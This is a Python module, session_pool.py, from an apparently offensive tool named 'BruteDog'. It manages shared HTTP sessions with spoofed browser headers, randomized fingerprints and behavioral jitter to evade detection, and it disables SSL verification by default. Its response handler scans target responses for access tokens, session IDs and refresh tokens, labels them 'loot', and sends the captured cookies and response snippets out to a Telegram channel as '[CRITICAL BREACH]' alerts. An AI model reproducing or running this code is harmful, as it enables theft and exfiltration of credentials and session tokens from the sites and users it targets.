#!/usr/bin/env python3
"""
SESSION_POOL.PY v8.8 — Persistent Session & Cookie Jar Pool
"""
import asyncio
import logging
from typing import Any, Dict, Optional, Union

import httpx

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.telegram_notifier import send_telegram_alert

logger = logging.getLogger("BruteDog.SessionPool")

HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
]

SESSION_FIELD_MARKERS = (
    '"access_token"',
    '"auth_token"',
    '"session_id"',
    '"refresh_token"',
)


def _supports_http2() -> bool:
    try:
        import h2  # noqa: F401
        return True
    except ImportError:
        return False


def broadcast_tg_alert_sync(loot_type, details):
    """Schedules high-priority notifications non-blockingly when an event loop is active."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
            task.add_done_callback(lambda t: t.exception() if not t.cancelled() else None)
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
        except Exception:
            pass


class PersistentSessionPool:
    """Manages shared cookies, headers, and pooled HTTP clients."""

    def __init__(self, base_url: str, verify_ssl: bool = False, http2: bool = True):
        self.base_url = (base_url or "").rstrip("/")
        self.verify_ssl = verify_ssl
        self.http2 = bool(http2 and _supports_http2())

        self.cookie_jar = httpx.Cookies()
        self.default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Cache-Control": "no-cache",
        }
        self.default_headers.update(get_randomized_hints())
        self._sync_client: Optional[httpx.Client] = None
        self._async_client: Optional[httpx.AsyncClient] = None

    def update_headers(self, new_headers: Dict[str, str]) -> None:
        """Updates shared default headers and refreshes active pooled clients."""
        if not isinstance(new_headers, dict):
            return
        self.default_headers.update(new_headers)
        if self._sync_client is not None:
            self._sync_client.headers.update(new_headers)
        if self._async_client is not None:
            self._async_client.headers.update(new_headers)

    def set_csrf_token(self, token: str) -> None:
        """Sets standard CSRF header tokens when a non-empty token is provided."""
        if token:
            self.update_headers({
                "X-CSRF-TOKEN": str(token),
                "X-XSRF-TOKEN": str(token),
            })

    def get_client(self, timeout: float = 8.0) -> httpx.Client:
        """Returns a reusable synchronous httpx.Client sharing the pool's cookie jar."""
        if self._sync_client is None or self._sync_client.is_closed:
            self._sync_client = httpx.Client(
                base_url=self.base_url,
                cookies=self.cookie_jar,
                headers=self.default_headers,
                verify=self.verify_ssl,
                http2=self.http2,
                timeout=timeout,
                follow_redirects=True,
            )
        return self._sync_client

    def get_async_client(self, timeout: float = 8.0) -> httpx.AsyncClient:
        """Returns a reusable asynchronous httpx.AsyncClient sharing the pool's cookie jar."""
        if self._async_client is None or self._async_client.is_closed:
            self._async_client = httpx.AsyncClient(
                base_url=self.base_url,
                cookies=self.cookie_jar,
                headers=self.default_headers,
                verify=self.verify_ssl,
                http2=self.http2,
                timeout=timeout,
                follow_redirects=True,
            )
        return self._async_client

    async def aclose(self) -> None:
        """Closes pooled sync and async HTTP clients cleanly."""
        if self._async_client is not None and not self._async_client.is_closed:
            try:
                await self._async_client.aclose()
            except Exception:
                pass
        self._async_client = None
        self.close()

    def close(self) -> None:
        """Closes the pooled synchronous HTTP client."""
        if self._sync_client is not None and not self._sync_client.is_closed:
            try:
                self._sync_client.close()
            except Exception:
                pass
        self._sync_client = None

    def sync_cookies(self, response_cookies: Union[httpx.Cookies, dict, str]) -> None:
        """Synchronizes external cookie data into the shared cookie jar safely."""
        if not response_cookies:
            return
        try:
            if isinstance(response_cookies, str):
                for cookie_pair in response_cookies.split(";"):
                    if "=" in cookie_pair:
                        k, v = cookie_pair.strip().split("=", 1)
                        if k:
                            self.cookie_jar.set(k.strip(), v.strip())
            elif isinstance(response_cookies, dict):
                for k, v in response_cookies.items():
                    self.cookie_jar.set(str(k), str(v))
            elif hasattr(response_cookies, "items"):
                for k, v in response_cookies.items():
                    self.cookie_jar.set(str(k), str(v))
            else:
                self.cookie_jar.update(response_cookies)
        except Exception as exc:
            logger.debug(f"Cookie sync skipped: {exc}")

    def _process_response(self, resp: httpx.Response, url: str) -> tuple[int, dict, str]:
        if resp.cookies:
            self.cookie_jar.update(resp.cookies)

        set_cookie = resp.headers.get("set-cookie") or resp.headers.get("Set-Cookie")
        if set_cookie:
            self.sync_cookies(set_cookie)

        body = resp.text or ""
        body_lower = body.lower()
        is_spa_shell = (
            'id="root"' in body_lower
            or 'id="__next"' in body_lower
            or len(body.strip()) < 150
        )

        if (
            resp.status_code in (200, 201)
            and not is_spa_shell
            and any(marker in body_lower for marker in SESSION_FIELD_MARKERS)
        ):
            session_loot = {
                "url": f"{self.base_url}{url}" if not url.startswith("http") else url,
                "status": resp.status_code,
                "cookies": dict(self.cookie_jar),
                "response_snippet": body[:300],
            }
            broadcast_tg_alert_sync("Session Pool Loot Captured", session_loot)

        return resp.status_code, dict(resp.headers), body

    def request(
        self,
        method: str,
        path: str,
        payload: Optional[Dict[str, Any]] = None,
        timeout: float = 8.0,
    ) -> tuple:
        """Executes a synchronous request through the shared pool and returns (status, headers, body)."""
        apply_behavioral_jitter()

        clean_path = str(path or "/")
        url = clean_path if clean_path.startswith(("http://", "https://", "/")) else f"/{clean_path}"

        try:
            client = self.get_client(timeout=timeout)
            verb = (method or "GET").upper()
            if verb == "POST":
                if payload and any(isinstance(v, (dict, list)) for v in payload.values()):
                    resp = client.post(url, json=payload)
                else:
                    resp = client.post(url, data=payload)
            elif verb == "PUT":
                resp = client.put(url, json=payload)
            elif verb == "DELETE":
                resp = client.delete(url)
            else:
                resp = client.get(url)

            return self._process_response(resp, url)
        except Exception as exc:
            logger.debug(f"Request failed for {method} {url}: {exc}")
            return 0, {}, ""

    async def async_request(
        self,
        method: str,
        path: str,
        payload: Optional[Dict[str, Any]] = None,
        timeout: float = 8.0,
    ) -> tuple:
        """Executes an asynchronous request through the shared async pool."""
        await asyncio.to_thread(apply_behavioral_jitter)

        clean_path = str(path or "/")
        url = clean_path if clean_path.startswith(("http://", "https://", "/")) else f"/{clean_path}"

        try:
            client = self.get_async_client(timeout=timeout)
            verb = (method or "GET").upper()
            if verb == "POST":
                if payload and any(isinstance(v, (dict, list)) for v in payload.values()):
                    resp = await client.post(url, json=payload)
                else:
                    resp = await client.post(url, data=payload)
            elif verb == "PUT":
                resp = await client.put(url, json=payload)
            elif verb == "DELETE":
                resp = await client.delete(url)
            else:
                resp = await client.get(url)

            return self._process_response(resp, url)
        except Exception as exc:
            logger.debug(f"Async request failed for {method} {url}: {exc}")
            return 0, {}, ""
